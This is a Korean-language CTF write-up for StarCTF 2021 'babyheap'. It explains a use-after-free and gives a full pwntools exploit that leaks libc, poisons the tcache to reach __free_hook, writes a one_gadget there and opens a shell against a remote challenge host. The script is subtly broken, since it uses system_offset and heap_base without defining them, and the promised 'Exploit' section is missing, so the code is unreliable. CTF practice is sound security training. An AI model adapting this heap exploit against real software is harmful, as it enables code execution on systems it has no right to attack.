---
title: StarCTF 2021 - babyheap
categories:
 - pwnable
tags: heap, uaf, chunk_overlap
---

  

- Introduction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점			
- Reference

이제 ctftime.org에 올라오는 ctf 가능한 전부 참여하려고 한다.

# Introduction

바이너리 소개는 생략하도록 하겠다.

간단한 heap문제인데 `glibc-2.27`에도 tcache 방어기법이 적용된 버전이 있는 줄은 몰랐다. glibc 버전이 같아도 세부 버전이 조금씩 다른듯 하다.

chunk overlap 문제이고 malloc consolidate로 leak을 진행하고 chunk overlap으로 `tcache->fd`를 overwrite해서 `__free_hook`으로 할당하는 전형적인 힙 문제 익스로 진행한다.
# Vunlnerability

취약점은 `delete`함수에서 `free`를 해준 뒤 해당 포인터에 대한 NULL처리를 안해줘서 생기는 취약점이다.

# slv.py

  
```py
from pwn import *

debug = 1

if debug == 1:
    p = process(['./pwn'], env = {'LD_PRELOAD':'./libc.so.6'})

else:
    p = remote('52.152.231.198',8081)

e = ELF('./libc.so.6')

onegadget_offset = [0x4f3d5, 0x4f432, 0x10a41c]
free_hook_offset = e.symbols['__free_hook']


sla = lambda s,c : p.sendlineafter(s, str(c))
_p64 = lambda s : p64(s).decode('latin-1')

context.log_level = 'debug'


def add(index, size):

    sla('>> \n', 1)

    sla('\n', index)

    sla('\n', size)

    return


def delete(index):

    sla('>> \n', 2)

    sla('\n', index)

    return


def edit(index, content):

    sla('>> \n', 3)

    sla('\n', index)

    sla('\n', content)

    return


def show(index):

    sla('>> \n', 4)

    sla('\n', index)

    return


def leaveName(name):

    sla('>> \n', 5)

    sla('\n', name)

    return


def showName():

    sla('>> \n', 6)

    return


def main():

    for i in range(16):
        add(i, 0x60)

    for i in range(16):
        delete(i)

    add(15,0x20)

    leaveName('')

    show(8)

    libc_leak = u64(p.recvuntil('\n').decode('latin-1').split('\n')[0].ljust(8,'\x00'))

    libc_base = libc_leak - 0x3ebca0
    system_addr = libc_base + system_offset
    onegadget_addr = libc_base + onegadget_offset[1]
    free_hook_addr = libc_base + free_hook_offset

    log.info('libc_base : ' + hex(libc_base))
    log.info('system_addr : ' + hex(system_addr))
    log.info('heap_base : ' + hex(heap_base))


    add(0, 0x30)
    add(1, 0x30)
    add(2, 0x20)

    delete(2)

    payload = ''
    payload += _p64(0x31)
    payload += _p64(free_hook_addr-8)

    edit(8, payload)

    add(3, 0x20)
    add(4, 0x20)

    payload = ''
    payload += _p64(onegadget_addr)

    edit(4, payload)

    delete(0)

    p.interactive()

    return

if __name__ == '__main__':
    main()
```

# 느낀 점

앞으로 얼마 안남았으니까.. 진짜 힘내야겠다.

# Reference
